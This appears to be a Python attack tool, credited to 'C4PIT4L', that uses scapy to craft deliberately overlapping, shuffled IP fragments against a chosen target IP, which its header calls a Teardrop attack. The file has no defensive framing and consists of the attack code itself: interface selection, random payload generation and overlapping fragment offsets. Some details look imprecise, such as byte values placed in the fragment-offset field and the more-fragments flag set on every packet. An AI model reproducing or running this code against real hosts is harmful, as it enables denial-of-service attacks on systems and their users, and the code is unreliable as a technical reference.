# ---------------------------------------------------------------------------------#
# PacketCrafter creates fragmented packets for a Teardrop attack on a target.
# - Created By: C4PIT4L
# ---------------------------------------------------------------------------------#

from scapy.packet import Raw
from scapy.layers.inet import IP
import random
import socket
import psutil


class PacketCrafter:
    def __init__(self, target_ip, payload_size, frag_overlap_offset=100, packet_size=1500):
        self.target_ip = target_ip
        self.payload_size = payload_size
        self.frag_overlap_offset = frag_overlap_offset
        self.packet_size = packet_size
        self.local_ip = self.get_local_ip()
        self.network_device = self.select_network_device()
        self.total_fragments = (payload_size // (packet_size - 20)) + 1

        print(
            f"PacketCrafter initialized for {target_ip} with payload size: {payload_size} and {self.total_fragments} fragments.")
        print(f"Local IP: {self.local_ip}, using network device: {self.network_device}")

    @staticmethod
    def get_local_ip():
        """Retrieve the local machine's IP address."""
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        print(f"Local IP detected: {local_ip}")
        return local_ip

    @staticmethod
    def list_network_devices():
        """List all available network devices and their IP addresses."""
        devices = psutil.net_if_addrs()
        device_list = []
        for device, addrs in devices.items():
            for addr in addrs:
                if addr.family == socket.AF_INET:
                    device_list.append((device, addr.address))
        return device_list

    def select_network_device(self):
        """Select a network device from the available list."""
        devices = self.list_network_devices()
        if len(devices) == 0:
            print("No network devices found.")
            exit()

        print("Available network devices:")
        for index, (device, ip) in enumerate(devices):
            print(f"{index + 1}. {device} - IP: {ip}")

        selected_device_index = int(input("Select a network device (enter number): ")) - 1
        if selected_device_index < 0 or selected_device_index >= len(devices):
            print("Invalid selection. Exiting.")
            exit()

        selected_device = devices[selected_device_index]
        print(f"Selected device: {selected_device[0]} with IP {selected_device[1]}")

        self.local_ip = selected_device[1]
        return selected_device[0]

    def create_fragment(self, frag_offset, data):
        """Create a single fragmented packet."""
        fragment = IP(src=self.local_ip, dst=self.target_ip, flags="MF", frag=frag_offset) / Raw(load=data)
        print(f"Created fragment: Offset {frag_offset}, Length {len(data)} bytes")
        return fragment

    def generate_fragments(self):
        """Generate the fragmented packets."""
        fragments = []
        current_offset = 0
        remaining_data = self.payload_size
        overlap_offset = self.frag_overlap_offset
        payload = bytes(random.getrandbits(8) for _ in range(self.payload_size))

        for i in range(self.total_fragments):
            fragment_data = payload[current_offset:current_offset + self.packet_size - 20]

            if i > 0:
                current_offset -= overlap_offset

            current_offset = min(current_offset, len(payload) - len(fragment_data))

            fragment = self.create_fragment(frag_offset=current_offset, data=fragment_data)
            fragments.append(fragment)

            current_offset += len(fragment_data)
            remaining_data -= len(fragment_data)

            print(f"Generated fragment {i + 1} with offset {current_offset}.")

        random.shuffle(fragments)
        print("Fragments shuffled for added complexity.")

        return fragments
